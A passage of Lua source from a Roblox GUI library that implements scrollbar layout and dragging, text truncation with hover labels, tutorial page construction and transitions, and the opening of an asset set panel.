			scrollDrag.Image = "https://www.roblox.com/asset/?id=61367186"
			scrollDrag.Size = UDim2.new(1, 0, 0, 16)
			scrollDrag.BackgroundTransparency = 1
			scrollDrag.Name = "ScrollDrag"
			scrollDrag.Active = true
			scrollDrag.Parent = scrollbar
			
			local mouseDrag = Instance.new("ImageButton")
			mouseDrag.Active = false
			mouseDrag.Size = UDim2.new(1.5, 0, 1.5, 0)
			mouseDrag.AutoButtonColor = false
			mouseDrag.BackgroundTransparency = 1
			mouseDrag.Name = "mouseDrag"
			mouseDrag.Position = UDim2.new(-0.25, 0, -0.25, 0)
			mouseDrag.ZIndex = 10
		
			local style = "simple"
			if scrollStyle and tostring(scrollStyle) then
				style = scrollStyle
			end
			
			local scrollPosition = 1
			local rowSize = 0
			local howManyDisplayed = 0
				
			local layoutGridScrollBar = function()
				howManyDisplayed = 0
				local guiObjects = {}
				if orderList then
					for i, child in ipairs(orderList) do
						if child.Parent == frame then
							table.insert(guiObjects, child)
						end
					end
				else
					local children = frame:GetChildren()
					if children then
						for i, child in ipairs(children) do 
							if child:IsA("GuiObject") then
								table.insert(guiObjects, child)
							end
						end
					end
				end
				if #guiObjects == 0 then
					scrollUpButton.Active = false
					scrollDownButton.Active = false
					scrollDrag.Active = false
					scrollPosition = 1
					return
				end
		
				if scrollPosition > #guiObjects then
					scrollPosition = #guiObjects
				end
				
				if scrollPosition < 1 then scrollPosition = 1 end
				
				local totalPixelsY = frame.AbsoluteSize.Y
				local pixelsRemainingY = frame.AbsoluteSize.Y
				
				local totalPixelsX  = frame.AbsoluteSize.X
				
				local xCounter = 0
				local rowSizeCounter = 0
				local setRowSize = true
		
				local pixelsBelowScrollbar = 0
				local pos = #guiObjects
				
				local currentRowY = 0
		
				pos = scrollPosition
				--count up from current scroll position to fill out grid
				while pos <= #guiObjects and pixelsBelowScrollbar < totalPixelsY do
					xCounter = xCounter + guiObjects[pos].AbsoluteSize.X
					--previous pos was the end of a row
					if xCounter >= totalPixelsX then
						pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
						currentRowY = 0
						xCounter = guiObjects[pos].AbsoluteSize.X
					end
					if guiObjects[pos].AbsoluteSize.Y > currentRowY then
						currentRowY = guiObjects[pos].AbsoluteSize.Y
					end
					pos = pos + 1
				end
				--Count wherever current row left off
				pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
				currentRowY = 0
				
				pos = scrollPosition - 1
				xCounter = 0
				
				--objects with varying X,Y dimensions can rarely cause minor errors
				--rechecking every new scrollPosition is necessary to avoid 100% of errors
				
				--count backwards from current scrollPosition to see if we can add more rows
				while pixelsBelowScrollbar + currentRowY < totalPixelsY and pos >= 1 do
					xCounter = xCounter + guiObjects[pos].AbsoluteSize.X
					rowSizeCounter = rowSizeCounter + 1
					if xCounter >= totalPixelsX then
						rowSize = rowSizeCounter - 1
						rowSizeCounter = 0
						xCounter = guiObjects[pos].AbsoluteSize.X
						if pixelsBelowScrollbar + currentRowY <= totalPixelsY then
							--It fits, so back up our scroll position
							pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
							if scrollPosition <= rowSize then
								scrollPosition = 1 
								break
							else
								scrollPosition = scrollPosition - rowSize
							end
							currentRowY = 0
						else
							break
						end
					end
					
					if guiObjects[pos].AbsoluteSize.Y > currentRowY then
						currentRowY = guiObjects[pos].AbsoluteSize.Y
					end
		
					pos = pos - 1
				end
				
				--Do check last time if pos = 0
				if (pos == 0) and (pixelsBelowScrollbar + currentRowY <= totalPixelsY) then
					scrollPosition = 1
				end
		
				xCounter = 0
				--pos = scrollPosition
				rowSizeCounter = 0
				setRowSize = true
				local lastChildSize = 0
				
				local xOffset,yOffset = 0
				if guiObjects[1] then
					yOffset = math.ceil(math.floor(math.fmod(totalPixelsY,guiObjects[1].AbsoluteSize.X))/2)
					xOffset = math.ceil(math.floor(math.fmod(totalPixelsX,guiObjects[1].AbsoluteSize.Y))/2)
				end
				
				for i, child in ipairs(guiObjects) do
					if i < scrollPosition then
						--print("Hiding " .. child.Name)
						child.Visible = false
					else
						if pixelsRemainingY < 0 then
							--print("Out of Space " .. child.Name)
							child.Visible = false
						else
							--print("Laying out " .. child.Name)
							--GuiObject
							if setRowSize then rowSizeCounter = rowSizeCounter + 1 end
							if xCounter + child.AbsoluteSize.X >= totalPixelsX then
								if setRowSize then
									rowSize = rowSizeCounter - 1
									setRowSize = false
								end
								xCounter = 0
								pixelsRemainingY = pixelsRemainingY - child.AbsoluteSize.Y
							end
							child.Position = UDim2.new(child.Position.X.Scale,xCounter + xOffset, 0, totalPixelsY - pixelsRemainingY + yOffset)
							xCounter = xCounter + child.AbsoluteSize.X
							child.Visible = ((pixelsRemainingY - child.AbsoluteSize.Y) >= 0)
							if child.Visible then
								howManyDisplayed = howManyDisplayed + 1
							end
							lastChildSize = child.AbsoluteSize				
						end
					end
				end
		
				scrollUpButton.Active = (scrollPosition > 1)
				if lastChildSize == 0 then 
					scrollDownButton.Active = false
				else
					scrollDownButton.Active = ((pixelsRemainingY - lastChildSize.Y) < 0)
				end
				scrollDrag.Active = #guiObjects > howManyDisplayed
				scrollDrag.Visible = scrollDrag.Active
			end
		
		
		
			local layoutSimpleScrollBar = function()
				local guiObjects = {}	
				howManyDisplayed = 0
				
				if orderList then
					for i, child in ipairs(orderList) do
						if child.Parent == frame then
							table.insert(guiObjects, child)
						end
					end
				else
					local children = frame:GetChildren()
					if children then
						for i, child in ipairs(children) do 
							if child:IsA("GuiObject") then
								table.insert(guiObjects, child)
							end
						end
					end
				end
				if #guiObjects == 0 then
					scrollUpButton.Active = false
					scrollDownButton.Active = false
					scrollDrag.Active = false
					scrollPosition = 1
					return
				end
		
				if scrollPosition > #guiObjects then
					scrollPosition = #guiObjects
				end
				
				local totalPixels = frame.AbsoluteSize.Y
				local pixelsRemaining = frame.AbsoluteSize.Y
		
				local pixelsBelowScrollbar = 0
				local pos = #guiObjects
				while pixelsBelowScrollbar < totalPixels and pos >= 1 do
					if pos >= scrollPosition then
						pixelsBelowScrollbar = pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y
					else
						if pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y <= totalPixels then
							--It fits, so back up our scroll position
							pixelsBelowScrollbar = pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y
							if scrollPosition <= 1 then
								scrollPosition = 1
								break
							else
								--local ("Backing up ScrollPosition from -- " ..scrollPosition)
								scrollPosition = scrollPosition - 1
							end
						else
							break
						end
					end
					pos = pos - 1
				end
		
				pos = scrollPosition
				for i, child in ipairs(guiObjects) do
					if i < scrollPosition then
						--print("Hiding " .. child.Name)
						child.Visible = false
					else
						if pixelsRemaining < 0 then
							--print("Out of Space " .. child.Name)
							child.Visible = false
						else
							--print("Laying out " .. child.Name)
							--GuiObject
							child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
							pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y
							if  (pixelsRemaining >= 0) then
								child.Visible = true
								howManyDisplayed = howManyDisplayed + 1
							else
								child.Visible = false
							end		
						end
					end
				end
				scrollUpButton.Active = (scrollPosition > 1)
				scrollDownButton.Active = (pixelsRemaining < 0)
				scrollDrag.Active = #guiObjects > howManyDisplayed
				scrollDrag.Visible = scrollDrag.Active
			end
			
				
			local moveDragger = function()	
				local guiObjects = 0
				local children = frame:GetChildren()
				if children then
					for i, child in ipairs(children) do 
						if child:IsA("GuiObject") then
							guiObjects = guiObjects + 1
						end
					end
				end
				
				if not scrollDrag.Parent then return end
				
				local dragSizeY = scrollDrag.Parent.AbsoluteSize.y * (1/(guiObjects - howManyDisplayed + 1))
				if dragSizeY < 16 then dragSizeY = 16 end
				scrollDrag.Size = UDim2.new(scrollDrag.Size.X.Scale,scrollDrag.Size.X.Offset,scrollDrag.Size.Y.Scale,dragSizeY)
		
				local relativeYPos = (scrollPosition - 1)/(guiObjects - (howManyDisplayed))
				if relativeYPos > 1 then relativeYPos = 1
				elseif relativeYPos < 0 then relativeYPos = 0 end
				local absYPos = 0
				
				if relativeYPos ~= 0 then
					absYPos = (relativeYPos * scrollbar.AbsoluteSize.y) - (relativeYPos * scrollDrag.AbsoluteSize.y)
				end
				
				scrollDrag.Position = UDim2.new(scrollDrag.Position.X.Scale,scrollDrag.Position.X.Offset,scrollDrag.Position.Y.Scale,absYPos)
			end
		
			local reentrancyGuard = false
			local recalculate = function()
				if reentrancyGuard then
					return
				end
				reentrancyGuard = true
				wait()
				local success, err = nil
				if style == "grid" then
					success, err = pcall(function() layoutGridScrollBar() end)
				elseif style == "simple" then
					success, err = pcall(function() layoutSimpleScrollBar() end)
				end
				if not success then print(err) end
				moveDragger()
				reentrancyGuard = false
			end
			
			local doScrollUp = function()
				scrollPosition = (scrollPosition) - rowSize
				if scrollPosition < 1 then scrollPosition = 1 end
				recalculate(nil)
			end
			
			local doScrollDown = function()
				scrollPosition = (scrollPosition) + rowSize
				recalculate(nil)
			end
		
			local scrollUp = function(mouseYPos)
				if scrollUpButton.Active then
					scrollStamp = tick()
					local current = scrollStamp
					local upCon
					upCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						upCon:disconnect()
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
					doScrollUp()
					wait(0.2)
					local t = tick()
					local w = 0.1
					while scrollStamp == current do
						doScrollUp()
						if mouseYPos and mouseYPos > scrollDrag.AbsolutePosition.y then
							break
						end
						if not scrollUpButton.Active then break end
						if tick()-t > 5 then
							w = 0
						elseif tick()-t > 2 then
							w = 0.06
						end
						wait(w)
					end
				end
			end
		
			local scrollDown = function(mouseYPos)
				if scrollDownButton.Active then
					scrollStamp = tick()
					local current = scrollStamp
					local downCon
					downCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						downCon:disconnect()
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
					doScrollDown()
					wait(0.2)
					local t = tick()
					local w = 0.1
					while scrollStamp == current do
						doScrollDown()
						if mouseYPos and mouseYPos < (scrollDrag.AbsolutePosition.y + scrollDrag.AbsoluteSize.x) then
							break
						end
						if not scrollDownButton.Active then break end
						if tick()-t > 5 then
							w = 0
						elseif tick()-t > 2 then
							w = 0.06
						end
						wait(w)
					end
				end
			end
			
			local y = 0
			scrollDrag.MouseButton1Down:connect(function(x,y)
				if scrollDrag.Active then
					scrollStamp = tick()
					local mouseOffset = y - scrollDrag.AbsolutePosition.y
					local dragCon
					local upCon
					dragCon = mouseDrag.MouseMoved:connect(function(x,y)
						local barAbsPos = scrollbar.AbsolutePosition.y
						local barAbsSize = scrollbar.AbsoluteSize.y
						
						local dragAbsSize = scrollDrag.AbsoluteSize.y
						local barAbsOne = barAbsPos + barAbsSize - dragAbsSize
						y = y - mouseOffset
						y = y < barAbsPos and barAbsPos or y > barAbsOne and barAbsOne or y
						y = y - barAbsPos
						
						local guiObjects = 0
						local children = frame:GetChildren()
						if children then
							for i, child in ipairs(children) do 
								if child:IsA("GuiObject") then
									guiObjects = guiObjects + 1
								end
							end
						end
						
						local doublePercent = y/(barAbsSize-dragAbsSize)
						local rowDiff = rowSize
						local totalScrollCount = guiObjects - (howManyDisplayed - 1)
						local newScrollPosition = math.floor((doublePercent * totalScrollCount) + 0.5) + rowDiff
						if newScrollPosition < scrollPosition then
							rowDiff = -rowDiff
						end
						
						if newScrollPosition < 1 then
							newScrollPosition = 1
						end
						
						scrollPosition = newScrollPosition
						recalculate(nil)
					end)
					upCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						dragCon:disconnect(); dragCon = nil
						upCon:disconnect(); drag = nil
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				end
			end)
		
			local scrollMouseCount = 0
		
			scrollUpButton.MouseButton1Down:connect(
				function()
					scrollUp()
				end)
			scrollUpButton.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
		
		
			scrollDownButton.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
			scrollDownButton.MouseButton1Down:connect(
				function()
					scrollDown()	
				end)
				
			scrollbar.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
			scrollbar.MouseButton1Down:connect(
				function(x,y)
					if y > (scrollDrag.AbsoluteSize.y + scrollDrag.AbsolutePosition.y) then
						scrollDown(y)
					elseif y < (scrollDrag.AbsolutePosition.y) then
						scrollUp(y)
					end
				end)
		
		
			frame.ChildAdded:connect(function()
				recalculate(nil)
			end)
		
			frame.ChildRemoved:connect(function()
				recalculate(nil)
			end)
			
			frame.Changed:connect(
				function(prop)
					if prop == "AbsoluteSize" then
						--Wait a heartbeat for it to sync in
						recalculate(nil)
					end
				end)
			frame.AncestryChanged:connect(function() recalculate(nil) end)
		
			return frame, scrollUpButton, scrollDownButton, recalculate, scrollbar
		end
		local function binaryGrow(min, max, fits)
			if min > max then
				return min
			end
			local biggestLegal = min
		
			while min <= max do
				local mid = min + math.floor((max - min) / 2)
				if fits(mid) and (biggestLegal == nil or biggestLegal < mid) then
					biggestLegal = mid
					
					--Try growing
					min = mid + 1
				else
					--Doesn't fit, shrink
					max = mid - 1
				end
			end
			return biggestLegal
		end
		
		
		local function binaryShrink(min, max, fits)
			if min > max then
				return min
			end
			local smallestLegal = max
		
			while min <= max do
				local mid = min + math.floor((max - min) / 2)
				if fits(mid) and (smallestLegal == nil or smallestLegal > mid) then
					smallestLegal = mid
					
					--It fits, shrink
					max = mid - 1			
				else
					--Doesn't fit, grow
					min = mid + 1
				end
			end
			return smallestLegal
		end
		
		
		local function getGuiOwner(instance)
			while instance ~= nil do
				if instance:IsA("ScreenGui") or instance:IsA("BillboardGui")  then
					return instance
				end
				instance = instance.Parent
			end
			return nil
		end
		
		t.AutoTruncateTextObject = function(textLabel)
			local text = textLabel.Text
		
			local fullLabel = textLabel:Clone()
			fullLabel.Name = "Full" .. textLabel.Name 
			fullLabel.BorderSizePixel = 0
			fullLabel.BackgroundTransparency = 0
			fullLabel.Text = text
			fullLabel.TextXAlignment = Enum.TextXAlignment.Center
			fullLabel.Position = UDim2.new(0,-3,0,0)
			fullLabel.Size = UDim2.new(0,100,1,0)
			fullLabel.Visible = false
			fullLabel.Parent = textLabel
		
			local shortText = nil
			local mouseEnterConnection = nil
			local mouseLeaveConnection= nil
		
			local checkForResize = function()
				if getGuiOwner(textLabel) == nil then
					return
				end
				textLabel.Text = text
				if textLabel.TextFits then 
					--Tear down the rollover if it is active
					if mouseEnterConnection then
						mouseEnterConnection:disconnect()
						mouseEnterConnection = nil
					end
					if mouseLeaveConnection then
						mouseLeaveConnection:disconnect()
						mouseLeaveConnection = nil
					end
				else
					local len = string.len(text)
					textLabel.Text = text .. "~"
		
					--Shrink the text
					local textSize = binaryGrow(0, len, 
						function(pos)
							if pos == 0 then
								textLabel.Text = "~"
							else
								textLabel.Text = string.sub(text, 1, pos) .. "~"
							end
							return textLabel.TextFits
						end)
					shortText = string.sub(text, 1, textSize) .. "~"
					textLabel.Text = shortText
					
					--Make sure the fullLabel fits
					if not fullLabel.TextFits then
						--Already too small, grow it really bit to start
						fullLabel.Size = UDim2.new(0, 10000, 1, 0)
					end
					
					--Okay, now try to binary shrink it back down
					local fullLabelSize = binaryShrink(textLabel.AbsoluteSize.X,fullLabel.AbsoluteSize.X, 
						function(size)
							fullLabel.Size = UDim2.new(0, size, 1, 0)
							return fullLabel.TextFits
						end)
					fullLabel.Size = UDim2.new(0,fullLabelSize+6,1,0)
		
					--Now setup the rollover effects, if they are currently off
					if mouseEnterConnection == nil then
						mouseEnterConnection = textLabel.MouseEnter:connect(
							function()
								fullLabel.ZIndex = textLabel.ZIndex + 1
								fullLabel.Visible = true
								--textLabel.Text = ""
							end)
					end
					if mouseLeaveConnection == nil then
						mouseLeaveConnection = textLabel.MouseLeave:connect(
							function()
								fullLabel.Visible = false
								--textLabel.Text = shortText
							end)
					end
				end
			end
			textLabel.AncestryChanged:connect(checkForResize)
			textLabel.Changed:connect(
				function(prop) 
					if prop == "AbsoluteSize" then 
						checkForResize() 	
					end 
				end)
		
			checkForResize()
		
			local function changeText(newText)
				text = newText
				fullLabel.Text = text
				checkForResize()
			end
		
			return textLabel, changeText
		end
		
		local function TransitionTutorialPages(fromPage, toPage, transitionFrame, currentPageValue)	
			if fromPage then
				fromPage.Visible = false
				if transitionFrame.Visible == false then
					transitionFrame.Size = fromPage.Size
					transitionFrame.Position = fromPage.Position
				end
			else
				if transitionFrame.Visible == false then
					transitionFrame.Size = UDim2.new(0.0,50,0.0,50)
					transitionFrame.Position = UDim2.new(0.5,-25,0.5,-25)
				end
			end
			transitionFrame.Visible = true
			currentPageValue.Value = nil
		
			local newSize, newPosition
			if toPage then
				--Make it visible so it resizes
				toPage.Visible = true
		
				newSize = toPage.Size
				newPosition = toPage.Position
		
				toPage.Visible = false
			else
				newSize = UDim2.new(0.0,50,0.0,50)
				newPosition = UDim2.new(0.5,-25,0.5,-25)
			end
			transitionFrame:TweenSizeAndPosition(newSize, newPosition, Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, 0.3, true,
				function(state)
					if state == Enum.TweenStatus.Completed then
						transitionFrame.Visible = false
						if toPage then
							toPage.Visible = true
							currentPageValue.Value = toPage
						end
					end
				end)
		end
		
		t.CreateTutorial = function(name, tutorialKey, createButtons)
			local frame = Instance.new("Frame")
			frame.Name = "Tutorial-" .. name
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.new(0.6, 0, 0.6, 0)
			frame.Position = UDim2.new(0.2, 0, 0.2, 0)
		
			local transitionFrame = Instance.new("Frame")
			transitionFrame.Name = "TransitionFrame"
			transitionFrame.Style = Enum.FrameStyle.RobloxRound
			transitionFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
			transitionFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
			transitionFrame.Visible = false
			transitionFrame.Parent = frame
		
			local currentPageValue = Instance.new("ObjectValue")
			currentPageValue.Name = "CurrentTutorialPage"
			currentPageValue.Value = nil
			currentPageValue.Parent = frame
		
			local boolValue = Instance.new("BoolValue")
			boolValue.Name = "Buttons"
			boolValue.Value = createButtons
			boolValue.Parent = frame
		
			local pages = Instance.new("Frame")
			pages.Name = "Pages"
			pages.BackgroundTransparency = 1
			pages.Size = UDim2.new(1,0,1,0)
			pages.Parent = frame
		
			local function getVisiblePageAndHideOthers()
				local visiblePage = nil
				local children = pages:GetChildren()
				if children then
					for i,child in ipairs(children) do
						if child.Visible then
							if visiblePage then
								child.Visible = false
							else
								visiblePage = child
							end
						end
					end
				end
				return visiblePage
			end
		
			local showTutorial = function(alwaysShow)
				if alwaysShow or UserSettings().GameSettings:GetTutorialState(tutorialKey) == false then
					print("Showing tutorial-",tutorialKey)
					local currentTutorialPage = getVisiblePageAndHideOthers()
		
					local firstPage = pages:FindFirstChild("TutorialPage1")
					if firstPage then
						TransitionTutorialPages(currentTutorialPage, firstPage, transitionFrame, currentPageValue)	
					else
						error("Could not find TutorialPage1")
					end
				end
			end
		
			local dismissTutorial = function()
				local currentTutorialPage = getVisiblePageAndHideOthers()
		
				if currentTutorialPage then
					TransitionTutorialPages(currentTutorialPage, nil, transitionFrame, currentPageValue)
				end
		
				UserSettings().GameSettings:SetTutorialState(tutorialKey, true)
			end
		
			local gotoPage = function(pageNum)
				local page = pages:FindFirstChild("TutorialPage" .. pageNum)
				local currentTutorialPage = getVisiblePageAndHideOthers()
				TransitionTutorialPages(currentTutorialPage, page, transitionFrame, currentPageValue)
			end
		
			return frame, showTutorial, dismissTutorial, gotoPage
		end 
		
		local function CreateBasicTutorialPage(name, handleResize, skipTutorial, giveDoneButton)
			local frame = Instance.new("Frame")
			frame.Name = "TutorialPage"
			frame.Style = Enum.FrameStyle.RobloxRound
			frame.Size = UDim2.new(0.6, 0, 0.6, 0)
			frame.Position = UDim2.new(0.2, 0, 0.2, 0)
			frame.Visible = false
			
			local frameHeader = Instance.new("TextLabel")
			frameHeader.Name = "Header"
			frameHeader.Text = name
			frameHeader.BackgroundTransparency = 1
			frameHeader.FontSize = Enum.FontSize.Size24
			frameHeader.Font = Enum.Font.ArialBold
			frameHeader.TextColor3 = Color3.new(1,1,1)
			frameHeader.TextXAlignment = Enum.TextXAlignment.Center
			frameHeader.TextWrap = true
			frameHeader.Size = UDim2.new(1,-55, 0, 22)
			frameHeader.Position = UDim2.new(0,0,0,0)
			frameHeader.Parent = frame
		
			local skipButton = Instance.new("ImageButton")
			skipButton.Name = "SkipButton"
			skipButton.AutoButtonColor = false
			skipButton.BackgroundTransparency = 1
			skipButton.Image = "rbxasset://textures/ui/closeButton.png"
			skipButton.MouseButton1Click:connect(function()
				skipTutorial()
			end)
			skipButton.MouseEnter:connect(function()
				skipButton.Image = "rbxasset://textures/ui/closeButton_dn.png"
			end)
			skipButton.MouseLeave:connect(function()
				skipButton.Image = "rbxasset://textures/ui/closeButton.png"
			end)
			skipButton.Size = UDim2.new(0, 25, 0, 25)
			skipButton.Position = UDim2.new(1, -25, 0, 0)
			skipButton.Parent = frame
			
			
			if giveDoneButton then
				local doneButton = Instance.new("TextButton")
				doneButton.Name = "DoneButton"
				doneButton.Style = Enum.ButtonStyle.RobloxButtonDefault
				doneButton.Text = "Done"
				doneButton.TextColor3 = Color3.new(1,1,1)
				doneButton.Font = Enum.Font.ArialBold
				doneButton.FontSize = Enum.FontSize.Size18
				doneButton.Size = UDim2.new(0,100,0,50)
				doneButton.Position = UDim2.new(0.5,-50,1,-50)
				
				if skipTutorial then
					doneButton.MouseButton1Click:connect(function() skipTutorial() end)
				end
				
				doneButton.Parent = frame
			end
		
			local innerFrame = Instance.new("Frame")
			innerFrame.Name = "ContentFrame"
			innerFrame.BackgroundTransparency = 1
			innerFrame.Position = UDim2.new(0,0,0,25)
			innerFrame.Parent = frame
		
			local nextButton = Instance.new("TextButton")
			nextButton.Name = "NextButton"
			nextButton.Text = "Next"
			nextButton.TextColor3 = Color3.new(1,1,1)
			nextButton.Font = Enum.Font.Arial
			nextButton.FontSize = Enum.FontSize.Size18
			nextButton.Style = Enum.ButtonStyle.RobloxButtonDefault
			nextButton.Size = UDim2.new(0,80, 0, 32)
			nextButton.Position = UDim2.new(0.5, 5, 1, -32)
			nextButton.Active = false
			nextButton.Visible = false
			nextButton.Parent = frame
		
			local prevButton = Instance.new("TextButton")
			prevButton.Name = "PrevButton"
			prevButton.Text = "Previous"
			prevButton.TextColor3 = Color3.new(1,1,1)
			prevButton.Font = Enum.Font.Arial
			prevButton.FontSize = Enum.FontSize.Size18
			prevButton.Style = Enum.ButtonStyle.RobloxButton
			prevButton.Size = UDim2.new(0,80, 0, 32)
			prevButton.Position = UDim2.new(0.5, -85, 1, -32)
			prevButton.Active = false
			prevButton.Visible = false
			prevButton.Parent = frame
		
			if giveDoneButton then
				innerFrame.Size = UDim2.new(1,0,1,-75)
			else
				innerFrame.Size = UDim2.new(1,0,1,-22)
			end
		
			local parentConnection = nil
		
			local function basicHandleResize()
				if frame.Visible and frame.Parent then
					local maxSize = math.min(frame.Parent.AbsoluteSize.X, frame.Parent.AbsoluteSize.Y)
					handleResize(200,maxSize)
				end
			end
		
			frame.Changed:connect(
				function(prop)
					if prop == "Parent" then
						if parentConnection ~= nil then
							parentConnection:disconnect()
							parentConnection = nil
						end
						if frame.Parent and frame.Parent:IsA("GuiObject") then
							parentConnection = frame.Parent.Changed:connect(
								function(parentProp)
									if parentProp == "AbsoluteSize" then
										wait()
										basicHandleResize()
									end
								end)
							basicHandleResize()
						end
					end
		
					if prop == "Visible" then 
						basicHandleResize()
					end
				end)
		
			return frame, innerFrame
		end
		
		t.CreateTextTutorialPage = function(name, text, skipTutorialFunc)
			local frame = nil
			local contentFrame = nil
		
			local textLabel = Instance.new("TextLabel")
			textLabel.BackgroundTransparency = 1
			textLabel.TextColor3 = Color3.new(1,1,1)
			textLabel.Text = text
			textLabel.TextWrap = true
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.Font = Enum.Font.Arial
			textLabel.FontSize = Enum.FontSize.Size14
			textLabel.Size = UDim2.new(1,0,1,0)
		
			local function handleResize(minSize, maxSize)
				size = binaryShrink(minSize, maxSize,
					function(size)
						frame.Size = UDim2.new(0, size, 0, size)
						return textLabel.TextFits
					end)
				frame.Size = UDim2.new(0, size, 0, size)
				frame.Position = UDim2.new(0.5, -size/2, 0.5, -size/2)
			end
		
			frame, contentFrame = CreateBasicTutorialPage(name, handleResize, skipTutorialFunc)
			textLabel.Parent = contentFrame
		
			return frame
		end
		
		t.CreateImageTutorialPage = function(name, imageAsset, x, y, skipTutorialFunc, giveDoneButton)
			local frame = nil
			local contentFrame = nil
		
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.BackgroundTransparency = 1
			imageLabel.Image = imageAsset
			imageLabel.Size = UDim2.new(0,x,0,y)
			imageLabel.Position = UDim2.new(0.5,-x/2,0.5,-y/2)
		
			local function handleResize(minSize, maxSize)
				size = binaryShrink(minSize, maxSize,
					function(size)
						return size >= x and size >= y
					end)
				if size >= x and size >= y then
					imageLabel.Size = UDim2.new(0,x, 0,y)
					imageLabel.Position = UDim2.new(0.5,-x/2, 0.5, -y/2)
				else
					if x > y then
						--X is limiter, so 
						imageLabel.Size = UDim2.new(1,0,y/x,0)
						imageLabel.Position = UDim2.new(0,0, 0.5 - (y/x)/2, 0)
					else
						--Y is limiter
						imageLabel.Size = UDim2.new(x/y,0,1, 0)
						imageLabel.Position = UDim2.new(0.5-(x/y)/2, 0, 0, 0)
					end
				end
				size = size + 50
				frame.Size = UDim2.new(0, size, 0, size)
				frame.Position = UDim2.new(0.5, -size/2, 0.5, -size/2)
			end
		
			frame, contentFrame = CreateBasicTutorialPage(name, handleResize, skipTutorialFunc, giveDoneButton)
			imageLabel.Parent = contentFrame
		
			return frame
		end
		
		t.AddTutorialPage = function(tutorial, tutorialPage)
			local transitionFrame = tutorial.TransitionFrame
			local currentPageValue = tutorial.CurrentTutorialPage
		
			if not tutorial.Buttons.Value then
				tutorialPage.NextButton.Parent = nil
				tutorialPage.PrevButton.Parent = nil
			end
		
			local children = tutorial.Pages:GetChildren()
			if children and #children > 0 then
				tutorialPage.Name = "TutorialPage" .. (#children+1)
				local previousPage = children[#children]
				if not previousPage:IsA("GuiObject") then
					error("All elements under Pages must be GuiObjects")
				end
		
				if tutorial.Buttons.Value then
					if previousPage.NextButton.Active then
						error("NextButton already Active on previousPage, please only add pages with RbxGui.AddTutorialPage function")
					end
					previousPage.NextButton.MouseButton1Click:connect(
						function()
							TransitionTutorialPages(previousPage, tutorialPage, transitionFrame, currentPageValue)
						end)
					previousPage.NextButton.Active = true
					previousPage.NextButton.Visible = true
		
					if tutorialPage.PrevButton.Active then
						error("PrevButton already Active on tutorialPage, please only add pages with RbxGui.AddTutorialPage function")
					end
					tutorialPage.PrevButton.MouseButton1Click:connect(
						function()
							TransitionTutorialPages(tutorialPage, previousPage, transitionFrame, currentPageValue)
						end)
					tutorialPage.PrevButton.Active = true
					tutorialPage.PrevButton.Visible = true
				end
		
				tutorialPage.Parent = tutorial.Pages
			else
				--First child
				tutorialPage.Name = "TutorialPage1"
				tutorialPage.Parent = tutorial.Pages
			end
		end 
		
		t.CreateSetPanel = function(userIdsForSets, objectSelected, dialogClosed, size, position, showAdminCategories, useAssetVersionId)
		
			if not userIdsForSets then
				error("CreateSetPanel: userIdsForSets (first arg) is nil, should be a table of number ids")
			end
			if type(userIdsForSets) ~= "table" and type(userIdsForSets) ~= "userdata" then
				error("CreateSetPanel: userIdsForSets (first arg) is of type " ..type(userIdsForSets) .. ", should be of type table or userdata")
			end
			if not objectSelected then
				error("CreateSetPanel: objectSelected (second arg) is nil, should be a callback function!")
			end
			if type(objectSelected) ~= "function" then
				error("CreateSetPanel: objectSelected (second arg) is of type " .. type(objectSelected) .. ", should be of type function!")
			end
			if dialogClosed and type(dialogClosed) ~= "function" then
				error("CreateSetPanel: dialogClosed (third arg) is of type " .. type(dialogClosed) .. ", should be of type function!")
			end
			
			if showAdminCategories == nil then -- by default, don't show beta sets
				showAdminCategories = false
			end
		
			local arrayPosition = 1
			local insertButtons = {}
			local insertButtonCons = {}
			local contents = nil
			local setGui = nil
		
			-- used for water selections
			local waterForceDirection = "NegX"
			local waterForce = "None"
			local waterGui, waterTypeChangedEvent = nil
			
			local Data = {}
			Data.CurrentCategory = nil
			Data.Category = {}
			local SetCache = {}
			
			local userCategoryButtons = nil
			
			local buttonWidth = 64
			local buttonHeight = buttonWidth
			
			local SmallThumbnailUrl = nil
			local LargeThumbnailUrl = nil
			local BaseUrl = game:GetService("ContentProvider").BaseUrl:lower()
			local AssetGameUrl = string.gsub(BaseUrl, "www", "assetgame")
			
			if useAssetVersionId then
				LargeThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&assetversionid="
				SmallThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&assetversionid="
			else
				LargeThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="
				SmallThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&aid="
			end
				
			local function drillDownSetZIndex(parent, index)
				local children = parent:GetChildren()
				for i = 1, #children do
					if children[i]:IsA("GuiObject") then
						children[i].ZIndex = index
					end
					drillDownSetZIndex(children[i], index)
				end
			end
			
			-- for terrain stamping
			local currTerrainDropDownFrame = nil
